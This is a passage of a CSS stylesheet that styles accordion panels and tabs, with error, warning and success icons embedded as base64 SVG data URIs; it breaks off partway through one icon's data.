        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent .spa-arrow-btn:hover:before,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.transparent .spa-arrow-btn:hover:after {
            background-color: #6b5e51
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header .panel-status-icon {
            margin: 0 0 0 5px;
            display: none;
            width: 18px;
            height: 18px;
            background: transparent 0 0 no-repeat;
            background-size: 18px 18px;
            vertical-align: top
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header .panel-status-icon.error {
            background-image: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNDBweCIgaGVpZ2h0PSI0MXB4IiB2aWV3Qm94PSIwIDAgNDAgNDEiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDQzLjIgKDM5MDY5KSAtIGh0dHA6Ly93d3cuYm9oZW1pYW5jb2RpbmcuY29tL3NrZXRjaCAtLT4KICAgIDx0aXRsZT5yZWRfaWNvPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBTa2V0Y2guPC9kZXNjPgogICAgPGRlZnM+PC9kZWZzPgogICAgPGcgaWQ9IlBhZ2UtMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9InJlZF9pY28iIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xLjAwMDAwMCwgMC4wMDAwMDApIiBmaWxsLXJ1bGU9Im5vbnplcm8iPgogICAgICAgICAgICA8ZyBpZD0iUGF0aF9DbGlwcGluZ19QYXRoIiBmaWxsPSIjRDgyMDI3Ij4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik00MC41MiwzNC45IEwyNC42NiwzLjM1IEMyNC4wMjA1MTk5LDEuODk5NzExOTcgMjIuNTg1MDE0MiwwLjk2MzgxNTM1NSAyMSwwLjk2MzgxNTM1NSBDMTkuNDE0OTg1OCwwLjk2MzgxNTM1NSAxNy45Nzk0ODAxLDEuODk5NzExOTcgMTcuMzQsMy4zNSBMMS40OCwzNC44OSBDMC43ODA2NDgzNzgsMzYuMTkzOTAxMyAwLjgyODQxNDMzMSwzNy43NzE1MjY1IDEuNjA1MzY5MzgsMzkuMDMwNzI5NSBDMi4zODIzMjQ0Myw0MC4yODk5MzI1IDMuNzcwOTM1MDcsNDEuMDQwMjI4IDUuMjUsNDEgTDM2Ljc1LDQxIEMzOC4yMjYwOTQ4LDQxLjAzODIxNjUgMzkuNjExMzIzNCw0MC4yODkyMzM5IDQwLjM4NzYxMTMsMzkuMDMzMTcxMiBDNDEuMTYzODk5MiwzNy43NzcxMDg2IDQxLjIxNDMxMzgsMzYuMjAzMTY3MiA0MC41MiwzNC45IFoiIGlkPSJTaGFwZSI+PC9wYXRoPgogICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDxnIGlkPSJQYXRoIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNi4wMDAwMDAsIDI5LjAwMDAwMCkiIGZpbGw9IiNGRkZGRkYiPgogICAgICAgICAgICAgICAgPGNpcmNsZSBpZD0iT3ZhbCIgY3g9IjUiIGN5PSI0LjMxIiByPSI0LjEiPjwvY2lyY2xlPgogICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDxnIGlkPSJQYXRoLTIiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDE3LjAwMDAwMCwgOS4wMDAwMDApIiBmaWxsPSIjRkZGRkZGIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik00LDAuNzIgQzIuMjk4OTYyOTcsMC43MiAwLjkyLDIuMDk4OTYyOTcgMC45MiwzLjggTDAuOTIsMTUuMDggQzEuMDEzMDA0NjksMTYuNzEwMjM3OCAyLjM2MjExMTQzLDE3Ljk4NDU3MiAzLjk5NSwxNy45ODQ1NzIgQzUuNjI3ODg4NTcsMTcuOTg0NTcyIDYuOTc2OTk1MzEsMTYuNzEwMjM3OCA3LjA3LDE1LjA4IEw3LjA3LDMuOCBDNy4wNzAwMDg5NSwyLjEwMjg2MDU3IDUuNjk3MTMwNDgsMC43MjU1MTAxOTMgNCwwLjcyIFoiIGlkPSJTaGFwZSI+PC9wYXRoPgogICAgICAgICAgICA8L2c+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4=")
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header .panel-status-icon.warning {
            background-image: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNDBweCIgaGVpZ2h0PSI0MXB4IiB2aWV3Qm94PSIwIDAgNDAgNDEiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDQzLjIgKDM5MDY5KSAtIGh0dHA6Ly93d3cuYm9oZW1pYW5jb2RpbmcuY29tL3NrZXRjaCAtLT4KICAgIDx0aXRsZT5vcmFuZ2VfaWNvPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBTa2V0Y2guPC9kZXNjPgogICAgPGRlZnM+PC9kZWZzPgogICAgPGcgaWQ9IlBhZ2UtMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9Im9yYW5nZV9pY28iIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xLjAwMDAwMCwgMC4wMDAwMDApIiBmaWxsLXJ1bGU9Im5vbnplcm8iPgogICAgICAgICAgICA8ZyBpZD0iUGF0aF9DbGlwcGluZ19QYXRoIiBmaWxsPSIjRUI4QjNGIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik00MC41MiwzNC45IEwyNC42NiwzLjM1IEMyNC4wMjA1MTk5LDEuODk5NzExOTcgMjIuNTg1MDE0MiwwLjk2MzgxNTM1NSAyMSwwLjk2MzgxNTM1NSBDMTkuNDE0OTg1OCwwLjk2MzgxNTM1NSAxNy45Nzk0ODAxLDEuODk5NzExOTcgMTcuMzQsMy4zNSBMMS40OCwzNC44OSBDMC43ODA2NDgzNzgsMzYuMTkzOTAxMyAwLjgyODQxNDMzMSwzNy43NzE1MjY1IDEuNjA1MzY5MzgsMzkuMDMwNzI5NSBDMi4zODIzMjQ0Myw0MC4yODk5MzI1IDMuNzcwOTM1MDcsNDEuMDQwMjI4IDUuMjUsNDEgTDM2Ljc1LDQxIEMzOC4yMjYwOTQ4LDQxLjAzODIxNjUgMzkuNjExMzIzNCw0MC4yODkyMzM5IDQwLjM4NzYxMTMsMzkuMDMzMTcxMiBDNDEuMTYzODk5MiwzNy43NzcxMDg2IDQxLjIxNDMxMzgsMzYuMjAzMTY3MiA0MC41MiwzNC45IFoiIGlkPSJTaGFwZSI+PC9wYXRoPgogICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDxnIGlkPSJQYXRoIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNi4wMDAwMDAsIDI5LjAwMDAwMCkiIGZpbGw9IiNGRkZGRkYiPgogICAgICAgICAgICAgICAgPGNpcmNsZSBpZD0iT3ZhbCIgY3g9IjUiIGN5PSI0LjMxIiByPSI0LjEiPjwvY2lyY2xlPgogICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDxnIGlkPSJQYXRoLTIiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDE3LjAwMDAwMCwgOS4wMDAwMDApIiBmaWxsPSIjRkZGRkZGIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik00LDAuNzIgQzIuMjk4OTYyOTcsMC43MiAwLjkyLDIuMDk4OTYyOTcgMC45MiwzLjggTDAuOTIsMTUuMDggQzEuMDEzMDA0NjksMTYuNzEwMjM3OCAyLjM2MjExMTQzLDE3Ljk4NDU3MiAzLjk5NSwxNy45ODQ1NzIgQzUuNjI3ODg4NTcsMTcuOTg0NTcyIDYuOTc2OTk1MzEsMTYuNzEwMjM3OCA3LjA3LDE1LjA4IEw3LjA3LDMuOCBDNy4wNzAwMDg5NSwyLjEwMjg2MDU3IDUuNjk3MTMwNDgsMC43MjU1MTAxOTMgNCwwLjcyIFoiIGlkPSJTaGFwZSI+PC9wYXRoPgogICAgICAgICAgICA8L2c+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4=")
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header .panel-status-icon.success {
            background-image: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNDBweCIgaGVpZ2h0PSI0MHB4IiB2aWV3Qm94PSIwIDAgNDAgNDAiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDQzLjIgKDM5MDY5KSAtIGh0dHA6Ly93d3cuYm9oZW1pYW5jb2RpbmcuY29tL3NrZXRjaCAtLT4KICAgIDx0aXRsZT5ncmVlbl9pY288L3RpdGxlPgogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+CiAgICA8ZGVmcz48L2RlZnM+CiAgICA8ZyBpZD0iUGFnZS0xIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4KICAgICAgICA8ZyBpZD0iZ3JlZW5faWNvIiBmaWxsLXJ1bGU9Im5vbnplcm8iPgogICAgICAgICAgICA8ZyBpZD0iUGF0aCIgZmlsbD0iIzdDQjY0MiI+CiAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMjAsMCBDOC45NTQzMDUsLTEuMzMyMjY3NjNlLTE1IDIuNjY0NTM1MjZlLTE1LDguOTU0MzA1IDEuNzc2MzU2ODRlLTE1LDIwIEM4Ljg4MTc4NDJlLTE2LDMxLjA0NTY5NSA4Ljk1NDMwNSw0MCAyMCw0MCBDMzEuMDQ1Njk1LDQwIDQwLDMxLjA0NTY5NSA0MCwyMCBDNDAsMTQuNjk1NjcwMiAzNy44OTI4NjMyLDkuNjA4NTkxOTUgMzQuMTQyMTM1Niw1Ljg1Nzg2NDM4IEMzMC4zOTE0MDgxLDIuMTA3MTM2ODEgMjUuMzA0MzI5OCwtNC40NDA4OTIxZS0xNiAyMCwtOC44ODE3ODQyZS0xNiBMMjAsMCBaIiBpZD0iU2hhcGUiPjwvcGF0aD4KICAgICAgICAgICAgPC9nPgogICAgICAgICAgICA8ZyBpZD0iUGF0aC0yIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg2LjAwMDAwMCwgOS4wMDAwMDApIiBmaWxsPSIjRkZGRkZGIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0yNy4yMiwxLjQyIEMyNi41OTIzMjIzLDAuOTA1MTkxNzc0IDI1Ljc4MjgwNzUsMC42NjY3MzMxMjEgMjQuOTc2MjgzNiwwLjc1OTA2ODgwNiBDMjQuMTY5NzU5NiwwLjg1MTQwNDQ5MiAyMy40MzUwODQ5LDEuMjY2NjUxMiAyMi45NCwxLjkxIEwxMi43NSwxNC44MyBMNS42Miw5IEM0Ljk5MjMyMjM0LDguNDg1MTkxNzcgNC4xODI4MDc1Miw4LjI0NjczMzEyIDMuMzc2MjgzNTgsOC4zMzkwNjg4MSBDMi41Njk3NTk2Myw4LjQzMTQwNDQ5IDEuODM1MDg0OTEsOC44NDY2NTEyIDEuMzQsOS40OSBDMC4yODY1NTE1MzUsMTAuODI0MzA5NSAwLjQ5MDc3MzI1LDEyLjc1NTUzNjYgMS44LDEzLjg0IEwxMS4zLDIxLjU2IEMxMS45MjgyMjcyLDIyLjA3ODA0NDggMTIuNzQwMDQ4MiwyMi4zMTg0NjY0IDEzLjU0OTA2MDcsMjIuMjI2MDYxOCBDMTQuMzU4MDczMiwyMi4xMzM2NTcxIDE1LjA5NDc3MDYsMjEuNzE2MzY1IDE1LjU5LDIxLjA3IEwyNy42OSw1LjczIEMyOC43MTQ3NzgzLDQuMzk5ODM4NDIgMjguNTA3Mzg3NywyLjQ5ODAyMjgzIDI3LjIyLDEuNDIgTDI3LjIyLDEuNDIgWiIgaWQ9IlNoYXBlIj48L3BhdGg+CiAgICAgICAgICAgIDwvZz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg==")
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.error .panel-status-icon.error {
            display: inline-block
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.warning .panel-status-icon.warning {
            display: inline-block
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-header.success .panel-status-icon.success {
            display: inline-block
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-content {
            max-height: 0;
            overflow: hidden;
            background-color: #F9F7F4;
            padding: 0;
            margin: 0;
            -webkit-transition: max-height 300ms cubic-bezier(0, 1, 0.5, 1);
            transition: max-height 300ms cubic-bezier(0, 1, 0.5, 1)
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-content.transparent {
            background-color: transparent
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-content.light {
            background-color: #fff
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-content .content {
            padding-top: 10px;
            padding-bottom: 10px
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-content .content ul,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-content .content ol {
            margin-left: 40px
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-content .content ul li,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-content .content ol li {
            margin-bottom: 10px
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-content .content>:last-child,
        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel .panel-content .content>.row .columns>:last-child {
            margin-bottom: 0
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel.active>.panel-header .spa-accordion-arrow {
            -webkit-transform: rotate(90deg);
            transform: rotate(90deg)
        }

        [data-sparta-container] .accordion-wrapper .accordion-panels .accordion-panel.active .panel-content {
            max-height: 1000px;
            overflow: hidden;
            -webkit-transition: max-height 300ms ease-in;
            transition: max-height 300ms ease-in
        }

        [data-sparta-container] .accordion-wrapper.innerPanels .accordion-panels .accordion-panel .panel-header .spa-accordion-arrow {
            -webkit-transform: initial;
            transform: initial
        }

        [data-sparta-container] .accordion-wrapper.innerPanels .accordion-panels .accordion-panel .panel-content {
            max-height: 0;
            overflow: hidden;
            -webkit-transition: max-height 300ms cubic-bezier(0, 1, 0.5, 1);
            transition: max-height 300ms cubic-bezier(0, 1, 0.5, 1)
        }

        [data-sparta-container] .accordion-wrapper.innerPanels .accordion-panels .accordion-panel.active>.panel-header .spa-accordion-arrow {
            -webkit-transform: rotate(90deg);
            transform: rotate(90deg)
        }

        [data-sparta-container] .accordion-wrapper.innerPanels .accordion-panels .accordion-panel.active .panel-content {
            max-height: 1000px;
            overflow: hidden;
            -webkit-transition: max-height 300ms ease-in;
            transition: max-height 300ms ease-in
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist {
            display: block;
            visibility: visible;
            border: 1px solid transparent
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab {
            display: inline-block;
            font-size: 24px;
            font-family: "cnx-regular", Helvetica, Arial, sans-serif;
            text-decoration: none;
            cursor: pointer;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            color: #6b5e51;
            background-color: #ECE7DD;
            padding: 10px 20px;
            border: 1px solid #ECE7DD;
            border-bottom: none;
            margin: 0 5px 0 -1px;
            -webkit-transition: background-color 500ms;
            transition: background-color 500ms
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab:hover,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab:hover {
            background-color: #D1C9C0
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab.active,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab.active {
            background-color: #fff
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab .panel-status-icon,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab .panel-status-icon {
            margin: 0 0 0 10px;
            display: none;
            width: 18px;
            height: 18px;
            background: transparent 0 0 no-repeat;
            background-size: 18px 18px
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab .panel-status-icon.error,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab .panel-status-icon.error {
            background-image: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNDBweCIgaGVpZ2h0PSI0MXB4IiB2aWV3Qm94PSIwIDAgNDAgNDEiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDQzLjIgKDM5MDY5KSAtIGh0dHA6Ly93d3cuYm9oZW1pYW5jb2RpbmcuY29tL3NrZXRjaCAtLT4KICAgIDx0aXRsZT5yZWRfaWNvPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBTa2V0Y2guPC9kZXNjPgogICAgPGRlZnM+PC9kZWZzPgogICAgPGcgaWQ9IlBhZ2UtMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9InJlZF9pY28iIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xLjAwMDAwMCwgMC4wMDAwMDApIiBmaWxsLXJ1bGU9Im5vbnplcm8iPgogICAgICAgICAgICA8ZyBpZD0iUGF0aF9DbGlwcGluZ19QYXRoIiBmaWxsPSIjRDgyMDI3Ij4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik00MC41MiwzNC45IEwyNC42NiwzLjM1IEMyNC4wMjA1MTk5LDEuODk5NzExOTcgMjIuNTg1MDE0MiwwLjk2MzgxNTM1NSAyMSwwLjk2MzgxNTM1NSBDMTkuNDE0OTg1OCwwLjk2MzgxNTM1NSAxNy45Nzk0ODAxLDEuODk5NzExOTcgMTcuMzQsMy4zNSBMMS40OCwzNC44OSBDMC43ODA2NDgzNzgsMzYuMTkzOTAxMyAwLjgyODQxNDMzMSwzNy43NzE1MjY1IDEuNjA1MzY5MzgsMzkuMDMwNzI5NSBDMi4zODIzMjQ0Myw0MC4yODk5MzI1IDMuNzcwOTM1MDcsNDEuMDQwMjI4IDUuMjUsNDEgTDM2Ljc1LDQxIEMzOC4yMjYwOTQ4LDQxLjAzODIxNjUgMzkuNjExMzIzNCw0MC4yODkyMzM5IDQwLjM4NzYxMTMsMzkuMDMzMTcxMiBDNDEuMTYzODk5MiwzNy43NzcxMDg2IDQxLjIxNDMxMzgsMzYuMjAzMTY3MiA0MC41MiwzNC45IFoiIGlkPSJTaGFwZSI+PC9wYXRoPgogICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDxnIGlkPSJQYXRoIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNi4wMDAwMDAsIDI5LjAwMDAwMCkiIGZpbGw9IiNGRkZGRkYiPgogICAgICAgICAgICAgICAgPGNpcmNsZSBpZD0iT3ZhbCIgY3g9IjUiIGN5PSI0LjMxIiByPSI0LjEiPjwvY2lyY2xlPgogICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDxnIGlkPSJQYXRoLTIiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDE3LjAwMDAwMCwgOS4wMDAwMDApIiBmaWxsPSIjRkZGRkZGIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik00LDAuNzIgQzIuMjk4OTYyOTcsMC43MiAwLjkyLDIuMDk4OTYyOTcgMC45MiwzLjggTDAuOTIsMTUuMDggQzEuMDEzMDA0NjksMTYuNzEwMjM3OCAyLjM2MjExMTQzLDE3Ljk4NDU3MiAzLjk5NSwxNy45ODQ1NzIgQzUuNjI3ODg4NTcsMTcuOTg0NTcyIDYuOTc2OTk1MzEsMTYuNzEwMjM3OCA3LjA3LDE1LjA4IEw3LjA3LDMuOCBDNy4wNzAwMDg5NSwyLjEwMjg2MDU3IDUuNjk3MTMwNDgsMC43MjU1MTAxOTMgNCwwLjcyIFoiIGlkPSJTaGFwZSI+PC9wYXRoPgogICAgICAgICAgICA8L2c+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4=")
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab .panel-status-icon.warning,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab .panel-status-icon.warning {
            background-image: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNDBweCIgaGVpZ2h0PSI0MXB4IiB2aWV3Qm94PSIwIDAgNDAgNDEiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDQzLjIgKDM5MDY5KSAtIGh0dHA6Ly93d3cuYm9oZW1pYW5jb2RpbmcuY29tL3NrZXRjaCAtLT4KICAgIDx0aXRsZT5vcmFuZ2VfaWNvPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBTa2V0Y2guPC9kZXNjPgogICAgPGRlZnM+PC9kZWZzPgogICAgPGcgaWQ9IlBhZ2UtMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9Im9yYW5nZV9pY28iIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xLjAwMDAwMCwgMC4wMDAwMDApIiBmaWxsLXJ1bGU9Im5vbnplcm8iPgogICAgICAgICAgICA8ZyBpZD0iUGF0aF9DbGlwcGluZ19QYXRoIiBmaWxsPSIjRUI4QjNGIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik00MC41MiwzNC45IEwyNC42NiwzLjM1IEMyNC4wMjA1MTk5LDEuODk5NzExOTcgMjIuNTg1MDE0MiwwLjk2MzgxNTM1NSAyMSwwLjk2MzgxNTM1NSBDMTkuNDE0OTg1OCwwLjk2MzgxNTM1NSAxNy45Nzk0ODAxLDEuODk5NzExOTcgMTcuMzQsMy4zNSBMMS40OCwzNC44OSBDMC43ODA2NDgzNzgsMzYuMTkzOTAxMyAwLjgyODQxNDMzMSwzNy43NzE1MjY1IDEuNjA1MzY5MzgsMzkuMDMwNzI5NSBDMi4zODIzMjQ0Myw0MC4yODk5MzI1IDMuNzcwOTM1MDcsNDEuMDQwMjI4IDUuMjUsNDEgTDM2Ljc1LDQxIEMzOC4yMjYwOTQ4LDQxLjAzODIxNjUgMzkuNjExMzIzNCw0MC4yODkyMzM5IDQwLjM4NzYxMTMsMzkuMDMzMTcxMiBDNDEuMTYzODk5MiwzNy43NzcxMDg2IDQxLjIxNDMxMzgsMzYuMjAzMTY3MiA0MC41MiwzNC45IFoiIGlkPSJTaGFwZSI+PC9wYXRoPgogICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDxnIGlkPSJQYXRoIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNi4wMDAwMDAsIDI5LjAwMDAwMCkiIGZpbGw9IiNGRkZGRkYiPgogICAgICAgICAgICAgICAgPGNpcmNsZSBpZD0iT3ZhbCIgY3g9IjUiIGN5PSI0LjMxIiByPSI0LjEiPjwvY2lyY2xlPgogICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDxnIGlkPSJQYXRoLTIiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDE3LjAwMDAwMCwgOS4wMDAwMDApIiBmaWxsPSIjRkZGRkZGIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik00LDAuNzIgQzIuMjk4OTYyOTcsMC43MiAwLjkyLDIuMDk4OTYyOTcgMC45MiwzLjggTDAuOTIsMTUuMDggQzEuMDEzMDA0NjksMTYuNzEwMjM3OCAyLjM2MjExMTQzLDE3Ljk4NDU3MiAzLjk5NSwxNy45ODQ1NzIgQzUuNjI3ODg4NTcsMTcuOTg0NTcyIDYuOTc2OTk1MzEsMTYuNzEwMjM3OCA3LjA3LDE1LjA4IEw3LjA3LDMuOCBDNy4wNzAwMDg5NSwyLjEwMjg2MDU3IDUuNjk3MTMwNDgsMC43MjU1MTAxOTMgNCwwLjcyIFoiIGlkPSJTaGFwZSI+PC9wYXRoPgogICAgICAgICAgICA8L2c+CiAgICAgICAgPC9nPgogICAgPC9nPgo8L3N2Zz4=")
        }

        .medium-up [data-accordion-type="tabs"].accordion-wrapper>.accordion-tablist>.accordion-tab .panel-status-icon.success,
        .medium-up [data-accordion-type="tabs"].accordion-wrapper.innerPanels>.accordion-tablist>.accordion-tab .panel-status-icon.success {
            background-image: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNDBweCIgaGVpZ2h0PSI0MHB4IiB2aWV3Qm94PSIwIDAgNDAgNDAiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDQzLjIgKDM5MDY5KSAtIGh0dHA6Ly93d3cuYm9oZW1pYW5jb2RpbmcuY29tL3NrZXRjaCAtLT4KICAgIDx0aXRsZT5ncmVlbl9pY288L3RpdGxlPgogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+CiAgICA8ZGVmcz48L2RlZnM+CiAgICA8ZyBpZD0iUGFnZS0xIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4KICAgICAgICA8ZyBpZD0iZ3JlZW5faWNvIiBmaWxsLXJ1bGU9Im5vbnplcm8iPgogICAgICAgICAgICA8ZyBpZD0iUGF0aCIgZmlsbD0iIzdDQjY0MiI+CiAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMjAsMCBDOC45NTQzMDUsLTEuMzMyMjY3NjNlLTE1IDIuNjY0NTM1MjZlLTE1LDguOTU0MzA1IDEuNzc2MzU2ODRlLTE1LDIwIEM4Ljg4MTc4NDJlLTE2LDMxLjA0NTY5NSA4Ljk1NDMwNSw0MCAyMCw0MCBDMzEuMDQ1Njk1LDQwIDQwLDMxLjA0NTY5NSA0MCwyMCBDNDAsMTQuNjk1NjcwMiAzNy44OTI4NjMyLDkuNjA4NTkxOTUgMzQuMTQyMTM1Niw1Ljg1Nzg2NDM4IEMzMC4zOTE0MDgxLDIuMTA3MTM2ODEgMjUuMzA0MzI5OCwtNC40NDA4OTIxZS0xNiAyMCwtOC44ODE3ODQyZS0xNiBMMjAsMCBaIiBpZD0iU2hhcGUiPjwvcGF0aD4KICAgICAgICAgICAgPC9nPgogICAgICAgICAgICA8ZyBpZD0iUGF0aC0yIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSg2LjAwMDAwMCwgOS4wMDAwMDApIiBmaWxsPSIjRkZGRkZGIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0yNy4yMiwxLjQyIEMyNi41OTIzMjIzLDAuOTA1MTkxNzc0IDI1Ljc4